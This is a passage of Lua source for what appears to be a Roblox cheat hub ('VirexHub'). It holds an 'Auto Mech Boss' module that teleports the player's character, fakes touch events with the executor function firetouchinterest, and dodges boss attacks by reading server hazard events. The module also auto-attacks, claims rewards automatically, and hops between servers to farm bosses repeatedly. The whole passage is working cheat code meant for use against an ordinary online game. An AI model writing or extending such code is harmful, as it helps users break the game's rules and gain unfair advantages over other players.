local v24, v25 = fn19(224, 184, true)
fn10(v23, fn9("Cancel"))
fn10(v25, fn9("Accept"))
tbl23 = {
{ textLabel, "Title" },
{ textLabel2, "Warn" },
{ textLabel3, "Body" },
{ textLabel4, "Tip" },
{ v23, "Cancel" },
{ v25, "Accept" },
}
fn11()
tbl24[#tbl24 + 1] = v22.MouseButton1Click:Connect(function()
if fn14 then
fn14()
end
end)
tbl24[#tbl24 + 1] = v24.MouseButton1Click:Connect(function()
if fn13 then
fn13()
end
end)
local currentCamera = workspace.CurrentCamera
if currentCamera then
tbl24[#tbl24 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn15)
end
fn15()
screenGui.Parent = v3
end
local function fn19()
fn18()
fn15()
if screenGui then
screenGui.Enabled = true
end
end
fn4(function()
for _, v22 in ipairs(tbl24) do
pcall(function()
v22:Disconnect()
end)
end
table.clear(tbl24)
if screenGui then
pcall(function()
screenGui:Destroy()
end)
screenGui = nil
end
end)
return {
Manual = fn12,
Hide = fn16,
Show = function(arg, arg2, arg3)
for k, v22 in pairs(arg) do
tbl22[k] = v22
end
fn11()
fn13 = function()
fn16()
if arg2 then
arg2()
end
end
fn14 = function()
fn16()
if arg3 then
arg3()
end
end
fn19()
fn11()
end,
}
end
tbl4.HopPrompt = fn8()
tbl4.MechBoot = function(arg)
local ok, result = pcall(function()
return require(ReplicatedStorage.Shared.Util.ScrambleBossHazards)
end)
local mech = {
Handle = nil,
Row = nil,
Status = "Idle",
Shown = nil,
Busy = false,
Generation = 0,
Hazards = {},
TravelSpeed = 250,
Radius = 18,
SwingGap = 0.12,
Dodge = true,
TryBall = true,
Leave = true,
HopWindow = 3,
OpenSeconds = 900,
ChainPath = "VirexHub/SAE_BossHop.json",
ChainUntil = 0,
ChainCycle = nil,
ArmedCycle = nil,
HopStamp = 0,
ArrivedByHop = false,
HopDelay = 5,
HopConfirmed = false,
HopNote = nil,
HopAt = nil,
Hopping = false,
LoadedAt = os.clock(),
BaitSpeed = 225,
Interval = 1800,
Run = nil,
SwapTools = true,
SwapIndex = 1,
SwapSince = 0,
MainHold = 0.3,
SecondHold = 0.4,
LastSwing = 0,
Links = {},
}
tbl4.Mech = mech
local function fn9()
return tbl4.Toggle(mech.Handle, false) == true
end
local function fn10()
return workspace:FindFirstChild("ScrambleArena")
end
local function fn11()
return workspace:FindFirstChild("ScrambleArenaPortal")
end
local function fn12()
return tbl4.InMechArena()
end
mech.StealFirst = function()
local steal = tbl4.Steal
if tbl4.Toggle(v5, false) == true and steal ~= nil and steal.Carrying == true then
return "Delivering the egg first"
end
if tbl4.Toggle(v5, false) == true and steal ~= nil and steal.BossOverride == true then
return "A filtered egg showed up, stealing it first"
end
return nil
end
mech.Defeated = function()
local v9 = fn10()
local str2 = v9 and tostring(v9:GetAttribute("Phase")) or ""
return str2 == "Defeated" or str2 == "Final" or str2 == "Ended" or str2 == "Won"
end
mech.CycleDone = function()
return mech.DoneCycle ~= nil and mech.DoneCycle == math.floor(workspace:GetServerTimeNow() / mech.Interval)
end
tbl4.MechFirst = function()
if not fn9() or mech.Hopping or mech.CycleDone() then
return false
end
local steal = tbl4.Steal
if steal ~= nil and (steal.Carrying == true or steal.BossOverride == true) then
return false
end
if fn12() then
return not mech.Defeated()
end
return mech.Busy == true or fn11() ~= nil
end
pcall(function()
local scheduleIntervalSeconds = require(ReplicatedStorage.Shared.Flags.ScrambleBossFlags).ScheduleIntervalSeconds
local interval = type(scheduleIntervalSeconds) == "table" and tonumber(scheduleIntervalSeconds.Value) or nil
if interval and interval > 0 then
mech.Interval = interval
end
end)
mech.Clock = function(arg2)
local n5 = math.max(0, math.floor(arg2 + 0.5))
return string.format("%d:%02d", math.floor(n5 / 60), n5 % 60)
end
mech.Timer = function()
local serverTimeNow = workspace:GetServerTimeNow()
local scrambleArena = workspace:FindFirstChild("ScrambleArena")
scrambleArena = scrambleArena and tonumber(scrambleArena:GetAttribute("SpawnsAt")) or 0
if workspace:FindFirstChild("ScrambleArenaPortal") then
if serverTimeNow < scrambleArena then
return "Mech portal is open  |  boss spawns in " .. mech.Clock(scrambleArena - serverTimeNow)
end
return "Mech portal is open now"
end
local interval = mech.Interval
return "Next Mech portal in " .. mech.Clock(math.ceil(serverTimeNow / interval) * interval - serverTimeNow)
end
local function fn13(arg2)
if not arg2 then
return nil
end
local hitbox = arg2:FindFirstChild("Hitbox", true)
if hitbox and hitbox:IsA("BasePart") then
return hitbox
end
for _, descendant in ipairs(arg2:GetDescendants()) do
if descendant:IsA("TouchTransmitter") and descendant.Parent and descendant.Parent:IsA("BasePart") then
return descendant.Parent
end
end
return nil
end
local function fn14(arg2)
local v9 = tbl4.Root()
if not v9 or not arg2 or type(firetouchinterest) ~= "function" then
return
end
pcall(function()
firetouchinterest(v9, arg2, 0)
task.wait(0.05)
firetouchinterest(v9, arg2, 1)
end)
end
local function fn15(arg2, arg3)
if not mech.Dodge or not ok or type(result) ~= "table" or type(result.Contains) ~= "function" then
return false
end
for k, hazard in pairs(mech.Hazards) do
local n5 = tonumber(hazard.At) or 0
local n6 = tonumber(hazard.Warn) or 0
if arg3 > n5 + (tonumber(hazard.Duration) or 0.5) + 1.5 then
mech.Hazards[k] = nil
continue
end
if not (n5 - n6 - 0.1 <= arg3) then
continue
end
local ok2, result2 = pcall(result.Contains, hazard, arg2, arg3)
if ok2 and result2 then
return true
end
end
return false
end
local function fn16()
local character = localPlayer.Character
local backpack = localPlayer:FindFirstChildOfClass("Backpack")
for _, v9 in ipairs({ character, backpack }) do
if v9 then
for _, child in ipairs(v9:GetChildren()) do
if child:IsA("Tool") and tostring(child:GetAttribute("ItemType")) == "Gear" then
if string.find(string.lower(tostring(child:GetAttribute("GearName") or "")), "scrambler", 1, true) then
return child
end
end
end
end
end
return nil
end
local function fn17()
local lastSwing = mech.LastSwing
if os.clock() - lastSwing < mech.SwingGap then
return
end
mech.LastSwing = os.clock()
local character = localPlayer.Character
local humanoid = character and character:FindFirstChildOfClass("Humanoid")
local flag = type(tbl4.FindBat) == "function" and tbl4.FindBat() or nil
local swapTools = mech.SwapTools and fn16() or nil
local v9
if flag and swapTools and flag ~= swapTools then
local secondHold = mech.SwapIndex == 2 and mech.SecondHold or mech.MainHold
local swapSince = mech.SwapSince
if os.clock() - swapSince >= secondHold then
mech.SwapIndex = mech.SwapIndex == 2 and 1 or 2
mech.SwapSince = os.clock()
end
swapTools = mech.SwapIndex == 2 and swapTools
v9 = swapTools or flag
else
v9 = flag or swapTools
end
if not v9 or not humanoid then
return
end
if v9.Parent ~= character then
pcall(function()
humanoid:EquipTool(v9)
end)
end
pcall(function()
v9:Activate()
end)
end
local function fn18(arg2, arg3)
local character = localPlayer.Character
local v9 = tbl4.Root()
if not character or not v9 then
return
end
if (v9.Position - arg2).Magnitude > 3 then
pcall(function()
character:PivotTo(CFrame.lookAt(arg2, Vector3.new(arg3.X, arg2.Y, arg3.Z)))
v9.AssemblyLinearVelocity = Vector3.zero
end)
end
end
local function fn19(arg2)
local mech2 = arg2:FindFirstChild("Mech")
local hitbox = mech2 and mech2:FindFirstChild("Hitbox")
if hitbox and hitbox:IsA("BasePart") then
return hitbox.Position, mech2
end
for _, child in ipairs(arg2:GetChildren()) do
if child:IsA("Model") and child.Name ~= "Ball" and child.Name ~= "LeaveTeleport" and child.Name ~= "Structure" then
local hitbox2 = child:FindFirstChild("Hitbox")
if hitbox2 and hitbox2:IsA("BasePart") then
return hitbox2.Position, child
end
end
end
return nil, nil
end
local function fn20(arg2, arg3)
local ball = arg2:FindFirstChild("Ball")
if not ball then
return false
end
local position = ball:GetBoundingBox().Position
local n5 = (tonumber(arg2:GetAttribute("FloorY")) or position.Y) + 3
local n6 = tonumber(arg2:GetAttribute("CoreStage")) or 0
if arg2:GetAttribute("BallStunned") == true then
mech.Run = nil
local vector = Vector3.new(arg3.Position.X - position.X, 0, arg3.Position.Z - position.Z)
local unit = vector.Magnitude > 1 and vector.Unit or Vector3.new(1, 0, 0)
fn18(Vector3.new(position.X, n5, position.Z) + unit * 10, position)
fn17()
mech.Status = string.format("Smashing the core  |  stage %d / 3  |  core %s", n6, tostring(arg2:GetAttribute("CoreHealth") or "?"))
return true
end
local str2 = tostring(arg2:GetAttribute("BallTarget"))
local attribute = arg2:GetAttribute("BallCoil")
if not mech.Run and str2 == tostring(localPlayer.UserId) and type(attribute) == "string" and attribute ~= "" then
local coils = arg2:FindFirstChild("Coils")
coils = coils and coils:FindFirstChild(attribute)
coils = coils and coils:GetAttribute("Home")
if typeof(coils) == "Vector3" then
local vector = Vector3.new(coils.X - position.X, 0, coils.Z - position.Z)
if vector.Magnitude > 1 then
local n7 = vector.Unit * 40
mech.Run = { Goal = Vector3.new(coils.X, n5, coils.Z) + n7, Until = os.clock() + 8, Coil = attribute }
end
end
end
if mech.Run then
local vector = Vector3.new(mech.Run.Goal.X - arg3.Position.X, 0, mech.Run.Goal.Z - arg3.Position.Z)
local flag = vector.Magnitude < 4
if not flag then
local until_ = mech.Run.Until
flag = os.clock() > until_
end
if flag then
mech.Run = nil
pcall(function()
arg3.AssemblyLinearVelocity = Vector3.new(0, arg3.AssemblyLinearVelocity.Y, 0)
end)
else
local n7 = vector.Unit * mech.BaitSpeed
pcall(function()
arg3.AssemblyLinearVelocity = Vector3.new(n7.X, arg3.AssemblyLinearVelocity.Y, n7.Z)
end)
mech.Status = string.format("Baiting the ball into %s  |  stage %d / 3", mech.Run.Coil, n6)
end
return true
end
local vector = Vector3.new(arg3.Position.X - position.X, 0, arg3.Position.Z - position.Z)
if vector.Magnitude > 18 or vector.Magnitude < 6 then
local vector2 = vector.Magnitude < 1 and Vector3.new(1, 0, 0) or vector.Unit
fn18(Vector3.new(position.X, n5, position.Z) + vector2 * 12, position)
end
mech.Status = string.format("Ball phase, waiting for it to lock on  |  stage %d / 3", n6)
return true
end
local function fn21(arg2, arg3)
local scrambleHuman = arg2:FindFirstChild("ScrambleHuman")
if not scrambleHuman then
return false
end
local humanoidRootPart = scrambleHuman:FindFirstChild("HumanoidRootPart") or scrambleHuman.PrimaryPart or scrambleHuman:FindFirstChildWhichIsA("BasePart")
local position = humanoidRootPart and humanoidRootPart.Position or scrambleHuman:GetPivot().Position
humanoidRootPart = humanoidRootPart and humanoidRootPart.AssemblyLinearVelocity or Vector3.zero
local n5 = position + Vector3.new(humanoidRootPart.X, 0, humanoidRootPart.Z) * 0.15
local vector = Vector3.new(arg3.Position.X - n5.X, 0, arg3.Position.Z - n5.Z)
local vector2 = vector.Magnitude > 1 and vector.Unit * 5 or Vector3.zero
local n6 = Vector3.new(n5.X, arg3.Position.Y, n5.Z) + vector2
local character = localPlayer.Character
pcall(function()
character:PivotTo(CFrame.lookAt(n6, Vector3.new(position.X, n6.Y, position.Z)))
end)
fn17()
mech.Status = string.format("Chasing Dr Scramble  |  hits %s / %s", tostring(arg2:GetAttribute("HumanHits") or 0), tostring(arg2:GetAttribute("HumanNeeded") or 3))
return true
end
local function fn22()
local v9 = fn10()
local v10 = tbl4.Root()
local character = localPlayer.Character
character = character and character:FindFirstChildOfClass("Humanoid")
if not v9 or not v10 then
return
end
local str2 = tostring(v9:GetAttribute("Phase"))
local n5 = tonumber(v9:GetAttribute("Health")) or 0
local n6 = tonumber(v9:GetAttribute("MaxHealth")) or 0
if tostring(v9:GetAttribute("GrabVictim")) == tostring(localPlayer.UserId) and character then
character.Jump = true
fn17()
mech.Status = "Grabbed, breaking free"
return
end
if str2 == "Ball" and mech.TryBall and fn20(v9, v10) then
return
end
if str2 == "Human" and fn21(v9, v10) then
return
end
local v11, flag = fn19(v9)
if not v11 then
local n7 = (tonumber(v9:GetAttribute("SpawnsAt")) or 0) - workspace:GetServerTimeNow()
mech.Status = n7 > 0 and "In the arena  |  boss spawns in " .. mech.Clock(n7) or string.format("Phase %s, waiting for the boss", str2)
return
end
local serverTimeNow = workspace:GetServerTimeNow()
local n7 = (tonumber(v9:GetAttribute("FloorY")) or v11.Y) + 3
local v12 = nil
local v13 = nil
for i = 0, 15 do
local n8 = i / 16 * 3.1415926535897931 * 2
local radius = mech.Radius
local z = v11.Z
local radius2 = mech.Radius
local vector = Vector3.new(v11.X + math.cos(n8) * radius, n7, z + math.sin(n8) * radius2)
local magnitude = (vector - v10.Position).Magnitude
if fn15(vector, serverTimeNow) or fn15(vector, serverTimeNow + 0.4) then
magnitude += 10000
end
if not v12 or magnitude < v12 then
v12 = magnitude
v13 = vector
end
end
if v13 then
fn18(v13, v11)
end
fn17()
flag = flag and flag:GetAttribute("Overheated") == true
mech.Status = string.format("Fighting %s  |  boss %d / %d%s", str2, math.floor(n5 + 0.5), math.floor(n6 + 0.5), flag and "  |  OVERHEAT" or "")
end
local function fn23()
local v9 = fn10()
local v10 = fn13(v9 and v9:FindFirstChild("LeaveTeleport"))
if not v10 then
return
end
local character = localPlayer.Character
pcall(function()
character:PivotTo(CFrame.new(v10.Position + Vector3.new(0, 3, 0)))
end)
task.wait(0.2)
fn14(v10)
end
tbl4.MechLeave = function()
for i = 1, 2 do
if not fn12() then
return true
end
pcall(fn23)
local n5 = 0
while fn12() and n5 < 4 do
n5 += task.wait(0.2)
end
end
return not fn12()
end
local function fn24(arg2)
local v9 = fn11()
local v10 = fn13(v9)
if not v9 or not v10 then
return false
end
local flag = type(tbl4.StealHome) == "function" and tbl4.StealHome() or nil
if flag and tbl4.InsideBase() then
local flag2 = mech.Respawned == true
local n5 = flag + Vector3.new(0, 3, 0)
local travelSpeed = flag2 and math.min(mech.TravelSpeed, 300) or mech.TravelSpeed
local now = os.clock()
while os.clock() - now < 20 do
if arg2 ~= mech.Generation or not fn9() or fn12() or mech.StealFirst() then
return false
end
local v11 = tbl4.Root()
if not v11 then
return false
end
local n6 = n5 - v11.Position
if n6.Magnitude <= 4 then
break
end
mech.Status = flag2 and "Respawned, going out through the safe zone" or "Leaving the base through the safe zone"
local magnitude = n6.Magnitude
local n7 = math.min(travelSpeed * RunService.Heartbeat:Wait(), magnitude)
pcall(function()
local rotation = v11.CFrame.Rotation
v11.CFrame = CFrame.new(v11.Position + n6.Unit * n7) * rotation
v11.AssemblyLinearVelocity = Vector3.zero
end)
end
if flag2 then
mech.Status = "Respawned, resting in the safe zone"
local n6 = 0
while n6 < 0.75 do
local v11 = tbl4.Root()
if v11 then
pcall(function()
v11.AssemblyLinearVelocity = Vector3.zero
end)
end
n6 += RunService.Heartbeat:Wait()
end
end
end
mech.Respawned = false
for i = 1, 5 do
if not (arg2 ~= mech.Generation or not fn9() or fn12() or mech.StealFirst()) then
local v11 = tbl4.Root()
if not (not v11 or not v10.Parent) then
mech.Status = "Teleporting to the Mech portal"
pcall(function()
v11.CFrame = v10.CFrame + Vector3.new(0, 1, 0)
v11.AssemblyLinearVelocity = Vector3.zero
v11.AssemblyAngularVelocity = Vector3.zero
end)
fn14(v10)
local n5 = os.clock() + 0.6
while os.clock() < n5 and not fn12() do
RunService.Heartbeat:Wait()
end
continue
end
end
break
end
if fn12() then
return true
end
local position = v10.Position
local now = os.clock()
local exitTo = nil
local v11
while true do
if not (os.clock() - now < 60) then
exitTo = 1
break
else
if arg2 ~= mech.Generation or not fn9() or fn12() or mech.StealFirst() then
exitTo = 1
break
else
v11 = tbl4.Root()
if not v11 then
exitTo = 2
break
else
local vector = Vector3.new(position.X - v11.Position.X, 0, position.Z - v11.Position.Z)
if not (vector.Magnitude <= 14) then
local n5 = vector.Unit * math.min(mech.TravelSpeed, vector.Magnitude / 0.05)
mech.Status = string.format("Going to the Mech portal, %d studs", math.floor(vector.Magnitude + 0.5))
pcall(function()
v11.AssemblyLinearVelocity = Vector3.new(n5.X, v11.AssemblyLinearVelocity.Y, n5.Z)
end)
RunService.Heartbeat:Wait()
continue
end
end
end
break
end
end
if exitTo ~= 1 then
if exitTo == 2 then
return false
end
pcall(function()
v11.AssemblyLinearVelocity = Vector3.zero
end)
fn14(v10)
task.wait(0.4)
if not fn12() then
pcall(function()
local rfScrambleBossEnterArena = networking:FindFirstChild("RF/ScrambleBoss/EnterArena")
if rfScrambleBossEnterArena then
rfScrambleBossEnterArena:InvokeServer()
end
end)
end
end
local now2 = os.clock()
while not fn12() and os.clock() - now2 < 5 do
task.wait(0.1)
end
return fn12()
end
local function fn25()
mech.Busy = true
mech.Generation = mech.Generation + 1
local generation = mech.Generation
tbl4.Shield("mech", true)
pcall(function()
if tbl4.Treadmill and tbl4.Treadmill.Riding or type(tbl4.OnBelt) == "function" and tbl4.OnBelt() then
tbl4.ExitBelt()
end
end)
if not fn12() and not mech.StealFirst() then
pcall(fn24, generation)
end
while generation == mech.Generation and fn9() and fn12() and not mech.StealFirst() do
local v9 = fn10()
local str2 = v9 and tostring(v9:GetAttribute("Phase")) or ""
if str2 == "Defeated" or str2 == "Final" or str2 == "Ended" or str2 == "Won" then
mech.Status = "Dr Scramble defeated, going back home"
if not mech.DefeatedAt and type(mech.StartChain) == "function" then
pcall(mech.StartChain)
end
mech.DefeatedAt = mech.DefeatedAt or os.clock()
mech.DoneCycle = math.floor(workspace:GetServerTimeNow() / mech.Interval)
local leave = mech.Leave
if leave then
local defeatedAt = mech.DefeatedAt
leave = os.clock() - defeatedAt > 1
end
if leave then
pcall(fn23)
task.wait(2)
else
task.wait(0.3)
end
else
pcall(fn22)
RunService.Heartbeat:Wait()
end
end
if fn12() and mech.StealFirst() then
mech.Status = tostring(mech.StealFirst()) .. ", leaving the arena"
pcall(fn23)
local n5 = 0
while fn12() and n5 < 5 do
n5 += task.wait(0.2)
end
end
mech.DefeatedAt = nil
mech.Run = nil
tbl4.Shield("mech", false)
tbl4.ReleaseMovement("mech")
mech.Busy = false
tbl3.Wake()
end
pcall(function()
local reScrambleBossHazard = networking:FindFirstChild("RE/ScrambleBoss/Hazard")
if reScrambleBossHazard and reScrambleBossHazard:IsA("RemoteEvent") then
table.insert(mech.Links, reScrambleBossHazard.OnClientEvent:Connect(function(arg2)
if type(arg2) == "table" then
mech.Hazards[arg2.Id or #mech.Hazards + 1] = arg2
end
end))
end
end)
table.insert(mech.Links, localPlayer.CharacterAdded:Connect(function()
mech.Respawned = true
end))
mech.Row = arg:CreateText({ Name = "Mech Status", Text = "Idle" })
mech.Handle = arg:CreateToggle({
Name = "Auto Mech Boss",
Default = false,
Callback = function()
if not fn9() then
mech.Generation = mech.Generation + 1
end
tbl3.Wake()
end,
})
for _, v9 in ipairs({
{ "Mech Tween Speed", 100, 1000, 250, 10, "studs/s", "TravelSpeed" },
{ "Main Weapon Hold", 0, 1.5, 0.3, 0.01, "s", "MainHold" },
{ "Scrambler Hold", 0, 1.5, 0.4, 0.01, "s", "SecondHold" },
}) do
arg:CreateSlider({
Name = v9[1],
Min = v9[2],
Max = v9[3],
Default = v9[4],
Increment = v9[5],
Unit = v9[6],
SubOf = mech.Handle,
Callback = function(arg2)
mech[v9[7]] = math.clamp(tonumber(arg2) or v9[4], v9[2], v9[3])
end,
})
end
for _, v9 in ipairs({
{ "Swap Two Weapons", "SwapTools" },
{ "Dodge Attacks", "Dodge" },
{ "Ball And Core Phase", "TryBall" },
{ "Leave After Fight", "Leave" },
}) do
arg:CreateToggle({
Name = v9[1],
Default = true,
SubOf = mech.Handle,
Callback = function(arg2)
mech[v9[2]] = arg2 ~= false
end,
})
end
mech.HopHandle = arg:CreateToggle({
Name = "Boss Server Hop",
Note = "After each boss, hops to a less crowded server to fight again",
Default = false,
SubOf = mech.Handle,
Callback = function()
mech.HopAt = nil
if not tbl4.Toggle(mech.HopHandle, false) then
mech.HopConfirmed = false
mech.HopNote = nil
pcall(tbl4.HopPrompt.Hide)
return
end
mech.ArmedCycle = math.floor(workspace:GetServerTimeNow() / mech.Interval)
if not tbl4.HopPrompt.Manual() then
mech.HopConfirmed = true
return
end
mech.ArrivedByHop = false
mech.HopConfirmed = false
if not pcall(tbl4.HopPrompt.Show, {
Title = "Boss Server Hop",
Warn = "WARNING",
Body = "After you beat a Mech boss, Boss Server Hop keeps joining less crowded servers. It fights the boss wherever one is still up and hops again when there is none. Turn it off to stop hopping.",
Tip = "",
Cancel = "Cancel",
Accept = "Turn On",
}, function()
mech.HopConfirmed = true
tbl3.Wake()
end, function()
pcall(function()
mech.HopHandle:Set(false)
end)
end) then
mech.HopConfirmed = true
end
end,
})
local tbl22
tbl22 = {
Loop = 0,
On = false,
Run = function(arg2)
local scrambleRead = tbl4.ScrambleRead
local scrambleRequest = tbl4.ScrambleRequest
if type(scrambleRead) ~= "function" or type(scrambleRequest) ~= "function" then
return
end
local v9 = scrambleRead(true)
local state = type(v9) == "table" and v9.State or nil
if type(state) ~= "table" or v9.Ready ~= true or v9.Enabled ~= true then
return
end
local data = ReplicatedStorage:FindFirstChild("Data")
local ok2, result2 = pcall(require, data and data:FindFirstChild("ScrambleMastery"))
if not ok2 or type(result2) ~= "table" or type(result2.Milestones) ~= "table" then
return
end
local claimedMilestoneIds = type(state.ClaimedMilestoneIds) == "table" and state.ClaimedMilestoneIds or {}
local n5 = tonumber(state.Mastery) or 0
local tbl23 = {}
for _, milestone in ipairs(result2.Milestones) do
local num = type(milestone) == "table" and tonumber(milestone.Kills) or nil
if num and milestone.Id and not claimedMilestoneIds[milestone.Id] and n5 >= num then
local ok3, result3 = pcall(result2.Presentation, milestone.Reward)
ok3 = ok3 and type(result3) == "table" and (result3.Title or result3.Name) or nil
table.insert(tbl23, {
Id = milestone.Id,
Text = (ok3 and tostring(ok3) or "a reward") .. " at " .. num .. " kills",
})
end
end
local ok3, result3 = pcall(result2.FinalMilestone)
if ok3 and type(result3) == "table" and claimedMilestoneIds[result3.Id] and result2.InfiniteMilestoneId then
local ok4, result4 = pcall(result2.ClaimableInfiniteCount, state)
if ok4 then
ok4 = (tonumber(result4) or 0) > 0
end
if ok4 then
table.insert(tbl23, { Id = result2.InfiniteMilestoneId, Text = "the repeat reward" })
end
end
for _, v10 in ipairs(tbl23) do
if arg2 ~= tbl22.Loop or not tbl22.On then
return
end
local Milestone = scrambleRequest("Milestone", v10.Id)
if type(Milestone) == "table" and Milestone.Ok == true then
tbl4.Notify("Boss Mastery", "Claimed " .. v10.Text)
end
task.wait(1)
end
end,
}
arg:CreateToggle({
Name = "Auto Claim Mastery",
Note = "Claims Boss Mastery rewards as soon as they unlock",
Default = false,
Callback = function(arg2)
tbl22.Loop = tbl22.Loop + 1
tbl22.On = arg2 == true
if not tbl22.On then
return
end
local loop = tbl22.Loop
task.spawn(function()
while loop == tbl22.Loop and tbl22.On do
pcall(tbl22.Run, loop)
task.wait(10)
end
end)
end,
})
fn4(function()
tbl22.Loop = tbl22.Loop + 1
tbl22.On = false
end)
mech.PortalCloses = function()
local interval = mech.Interval
return math.floor(workspace:GetServerTimeNow() / mech.Interval) * interval + mech.OpenSeconds
end
mech.SaveChain = function()
if type(writefile) ~= "function" then
return
end
pcall(function()
if type(isfolder) == "function" and type(makefolder) == "function" and not isfolder("VirexHub") then
makefolder("VirexHub")
end
writefile(mech.ChainPath, game:GetService("HttpService"):JSONEncode({ Until = mech.ChainUntil, Cycle = mech.ChainCycle, HopAt = mech.HopStamp }))
end)
end
mech.StartChain = function()
if not tbl4.Toggle(mech.HopHandle, false) or not mech.HopConfirmed then
return
end
local serverTimeNow = workspace:GetServerTimeNow()
local chainCycle = math.floor(serverTimeNow / mech.Interval)
local flag = mech.ChainUntil > serverTimeNow
local arrivedByHop
if flag then
arrivedByHop = flag
else
arrivedByHop = mech.ChainCycle == chainCycle and mech.ArrivedByHop
end
if arrivedByHop then
return
end
mech.ChainCycle = chainCycle
mech.ChainUntil = math.min(serverTimeNow + mech.HopWindow * 60, mech.PortalCloses())
mech.SaveChain()
end
pcall(function()
if type(isfile) == "function" and isfile(mech.ChainPath) then
local data = game:GetService("HttpService"):JSONDecode(readfile(mech.ChainPath))
if type(data) == "table" then
mech.ChainUntil = tonumber(data.Until) or 0
mech.ChainCycle = tonumber(data.Cycle)
mech.HopStamp = tonumber(data.HopAt) or 0
mech.ArrivedByHop = workspace:GetServerTimeNow() - mech.HopStamp < 120
end
end
end)
arg:CreateSlider({
Name = "Keep Hopping For",
Note = "Keeps fighting every boss it finds and hopping for this long",
Min = 1,
Max = 15,
Default = 3,
Increment = 1,
Unit = "min",
SubOf = mech.Handle,
Callback = function(arg2)
mech.HopWindow = math.clamp(math.floor(tonumber(arg2) or 3), 1, 15)
end,
})
tbl3.Add(function()
if not fn9() or not tbl4.Toggle(mech.HopHandle, false) or not mech.HopConfirmed then
mech.HopAt = nil
mech.HopNote = nil
return false
end
if mech.Hopping then
return false
end
local serverTimeNow = workspace:GetServerTimeNow()
if mech.ChainUntil > 0 and serverTimeNow >= mech.ChainUntil then
mech.ChainUntil = 0
mech.SaveChain()
end
if mech.ChainUntil <= serverTimeNow then
local n5 = math.floor(serverTimeNow / mech.Interval)
local n6 = serverTimeNow - n5 * mech.Interval
local flag = (mech.ArmedCycle == n5 or mech.ChainCycle ~= n5) and n6 >= 20 and n6 < mech.OpenSeconds
if flag then
local loadedAt = mech.LoadedAt
flag = os.clock() - loadedAt >= 8
end
if flag and not mech.Busy and not fn12() and not fn11() then
pcall(mech.StartChain)
end
if mech.ArmedCycle ~= n5 then
mech.ArmedCycle = nil
end
end
if mech.ChainUntil <= serverTimeNow then
local interval = mech.Interval
local n5 = serverTimeNow - math.floor(serverTimeNow / mech.Interval) * interval
mech.HopAt = nil
if mech.OpenSeconds <= n5 then
mech.HopNote = "Boss hop waits for the next portal"
elseif mech.ArrivedByHop and mech.ChainCycle == math.floor(serverTimeNow / mech.Interval) then
mech.HopNote = "Boss hop is done for this portal"
elseif mech.Busy or fn12() or fn11() then
mech.HopNote = "Boss hop starts after this boss"
else
mech.HopNote = "Looking for the boss here"
end
return false
end
local n5 = mech.ChainUntil - serverTimeNow
if mech.Busy or fn12() or fn11() then
mech.HopAt = nil
mech.HopNote = "Boss hop on, " .. mech.Clock(n5) .. " left"
return false
end
local loadedAt = mech.LoadedAt
if os.clock() - loadedAt < 8 then
mech.HopAt = nil
mech.HopNote = "Looking for the boss here"
return false
end
local steal = tbl4.Steal
local flag = tbl4.Toggle(v5, false) == true and steal
if flag then
flag = steal.Wanted == true or steal.Carrying == true or steal.Active == true
end
if flag then
mech.HopAt = nil
mech.HopNote = "A filtered egg is here, stealing before the hop"
return false
end
local v9 = mech
local hopAt = mech.HopAt
if not hopAt then
local hopDelay = mech.HopDelay
hopAt = os.clock() + hopDelay
end
v9.HopAt = hopAt
local hopAt2 = mech.HopAt
if os.clock() < hopAt2 then
mech.HopNote = string.format("No boss here, hopping in %ds  |  %s left", math.ceil(mech.HopAt - os.clock()), mech.Clock(n5))
return false
end
if type(tbl4.ServerHop) ~= "function" then
mech.HopNote = "Server hop is not ready"
return false
end
mech.Hopping = true
mech.HopNote = "Joining a less crowded server"
mech.HopStamp = workspace:GetServerTimeNow()
mech.SaveChain()
task.spawn(function()
local ok2, result2 = pcall(tbl4.ServerHop, "Least Players")
ok2 = ok2 and tostring(result2) or "error"
mech.Hopping = false
if ok2 == "waiting" then
mech.HopAt = os.clock() + 15
mech.HopNote = "Teleporting to the next server"
elseif ok2 == "fetch" then
mech.HopAt = os.clock() + 10
mech.HopNote = "Server list unavailable, trying again soon"
else
mech.HopAt = os.clock() + 3
mech.HopNote = "Hop did not land, trying again"
end
end)
return false
end)
tbl3.Add(function()
local row = mech.Row
if not fn9() then
mech.Status = "Off  |  " .. mech.Timer()
elseif not mech.Busy then
if fn12() then
mech.Status = "In the arena"
else
mech.Status = mech.Timer()
end
if mech.HopNote then
mech.Status = mech.Status .. "  |  " .. mech.HopNote
end
end
if row and mech.Shown ~= mech.Status and type(row.Set) == "function" then
mech.Shown = mech.Status
pcall(row.Set, row, mech.Status)
end
local invisibilityHandle = tbl4.InvisibilityHandle
local flag = invisibilityHandle ~= nil and tbl4.Toggle(invisibilityHandle, false)
if fn9() and (mech.Busy or fn12() or fn11()) then
mech.InvisResumeAt = nil
if not tbl4.InvisMech then
tbl4.InvisMech = true
if flag then
tbl4.Notify("Invisibility", "Invisibility is paused for the Mech boss and comes back after it.")
end
end
elseif tbl4.InvisMech and not mech.Busy then
mech.InvisResumeAt = mech.InvisResumeAt or os.clock() + 5
if mech.InvisResumeAt <= os.clock() then
mech.InvisResumeAt = nil
tbl4.InvisMech = false
if flag then
tbl4.Notify("Invisibility", "The Mech boss is over, Invisibility is back on.")
end
end
end
if not fn9() or mech.Busy then
return true
end
if mech.CycleDone() and (fn12() or fn11()) then
if fn12() then
mech.Status = "Boss defeated, leaving the arena"
if not mech.Leaving then
mech.Leaving = true
task.spawn(function()
pcall(tbl4.MechLeave)
mech.Leaving = false
end)
end
else
mech.Status = "Boss defeated  |  " .. mech.Timer()
end
return true
end
if fn12() or fn11() then
local v9 = mech.StealFirst()
if v9 then
mech.Status = v9 .. "  |  " .. mech.Timer()
if fn12() and not mech.Leaving then
mech.Leaving = true
task.spawn(function()
pcall(tbl4.MechLeave)
mech.Leaving = false
end)
end
return true
end
local character = localPlayer.Character
if character and character:GetAttribute("InvisApplied") == true then
mech.Status = "Leaving Invisibility for the boss"
return true
end
if not tbl4.ClaimMovement("mech") then
mech.Status = "Waiting for " .. tostring(tbl4.Movement.Owner or "movement")
return true
end
task.spawn(fn25)
return true
end
return true
end)
fn4(function()
tbl4.InvisMech = false
mech.Generation = mech.Generation + 1
for _, link in ipairs(mech.Links) do
pcall(function()
link:Disconnect()
end)
end
pcall(tbl4.Shield, "mech", false)
pcall(tbl4.ReleaseMovement, "mech")
end)
end
tbl4.MechBoot(v7)
do
local n5 = 1
local n6 = 1
local v9 = nil
local v10 = nil
local flag = false
local n7 = 0
local n8 = 0
local n9 = 0
local v11 = nil
local n10 = 0
